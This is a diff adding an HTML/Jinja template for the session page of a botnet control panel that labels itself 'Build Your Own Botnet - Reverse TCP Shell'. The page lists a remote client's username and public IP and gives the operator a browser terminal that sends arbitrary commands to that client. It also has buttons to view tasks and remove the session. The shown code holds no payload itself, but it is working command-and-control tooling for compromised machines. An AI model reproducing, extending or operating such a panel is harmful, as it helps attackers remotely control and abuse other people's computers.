@@ -1,0 +1,150 @@
+{% extends "layout.html" %}
+
+
+{% block slider %}
+<div class="demo-1 black-canvas" style="z-index: 0;">
+	<div class="content">
+		<div id="large-header" class="large-header">
+			<canvas id="demo-canvas"></canvas>
+			<h1></h1>
+		</div>
+	</div>
+</div>
+{% endblock slider %}
+
+{% block main %}
+
+<div class="container" style="z-index: 1; position: absolute; top: 0%; left: 50%; transform: translate(-50%, -100%);">
+
+	<script src="https://code.jquery.com/jquery-latest.js"></script>
+
+	<script src="assets/js/jquery-terminal/js/jquery.terminal-2.12.0.min.js"></script>
+
+	<script src="assets/js/jquery-terminal/js/jquery.mousewheel-min.js"></script>
+
+	<link href="assets/js/jquery-terminal/css/jquery.terminal-2.12.0.min.css" rel="stylesheet"/>
+
+	<h1 style="color: white">Shell {{session_uid}}</h1>
+
+	<!-- Terminal emulator -->
+	<div id="byob_terminal" style="height: 200px; --char-width: 7.20313; border: 3px solid white; border-radius: 10px; width: 70%" class="terminal">
+
+	</div>
+
+	<br/>
+
+	<!-- Info button -->
+	<button class="terminal-button" onclick="jQuery('#info-1').modal('show');"><i class="fa fa-info-circle"></i></button>
+
+	<!-- Tasks button -->
+	<button class="terminal-button" name="{{ session_uid }}" onclick="getTasks(this)"><i class="entypo-list"></i></button>
+
+	<!-- Remove session button -->
+	<button class="terminal-button" name="{{ session_uid }}" onclick="removeSession(this)"><i class="entypo-trash"></i></button>
+
+	<br/>
+
+	<div class="modal fade" id="info-1" style="height: 500px">
+		<div class="modal-dialog">
+			<div class="modal-content">
+				
+				<div class="modal-header">
+					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+					<h4 class="modal-title">Client Information</h4>
+				</div>
+				
+				<div class="modal-body">
+					<table class="table table-bordered responsive" id="info">
+					{% for key, value in info.items() %}
+						<tr>
+							<td><strong>{{key}}</strong></td>
+							<td>{{value}}</td>
+						</tr>
+					{% endfor %}
+					</table>
+				</div>
+				
+				<div class="modal-footer">
+					<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+				</div>
+			</div>
+		</div>
+	</div>
+
+
+	<script>
+		var coll = document.getElementsByClassName("collapsible");
+
+		for (let i = 0; i < coll.length; i++) {
+		  coll[i].addEventListener("click", function() {
+		    this.classList.toggle("active");
+		    var content = this.nextElementSibling;
+		    if (content.style.maxHeight){
+		      content.style.maxHeight = null;
+		    } else {
+		      content.style.maxHeight = content.scrollHeight + "px";
+		    } 
+		  });
+		}
+
+		function getParameterByName(name, url) {
+		    if (!url) url = window.location.href;
+		    name = name.replace(/[\[\]]/g, '\\$&');
+		    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+		        results = regex.exec(url);
+		    if (!results) return null;
+		    if (!results[2]) return '';
+		    return decodeURIComponent(results[2].replace(/\+/g, ' '));
+		}
+
+		function getTasks(element) {
+			location.href="/tasks?session_uid="+element.getAttribute('name');
+		}
+
+		function removeSession(element) {
+			$.post("{{ url_for('session.session_remove') }}", {session_uid: element.getAttribute('name')},
+									function(response) {
+										location.href = "/sessions";
+									});
+		}
+	</script>
+
+	<script>
+//		$(document).ready(function() {
+//			$('#info').toggle();
+//		});
+		$('.collapsible').on("click", function(){$('#info').slideToggle()});
+	</script>
+
+	<script>
+		jQuery(function($, undefined) {
+		    $('#byob_terminal').terminal(function(command) {
+		        if (command !== '' && command !== ' ' && command !== '\n'	) {
+		            try {
+		                var terminal = this;
+		                $.post("{{ url_for('session.session_cmd') }}", {session_uid: getParameterByName('session_uid'), cmd: command}, function(response) {
+		                		try {
+									let data = JSON.parse(response);
+									let output = JSON.stringify(data, null, 2);
+									terminal.echo(output);
+		                		} catch (e) {
+		                			terminal.echo('');
+		                			terminal.echo(response);
+		                		}
+		                });
+		            } catch(e) {
+		                this.error(new String(e));
+		            }
+		        } else {
+		           this.echo('');
+		        }
+		    }, {
+		        greetings: 'Build Your Own Botnet - Reverse TCP Shell',
+		        name: 'byob',
+		        height: 200,
+		        prompt: '{{info["username"]}}' + '@' + '{{info["public_ip"]}}> ',
+		    });
+		});
+	</script>
+</div>
+{% endblock main %}
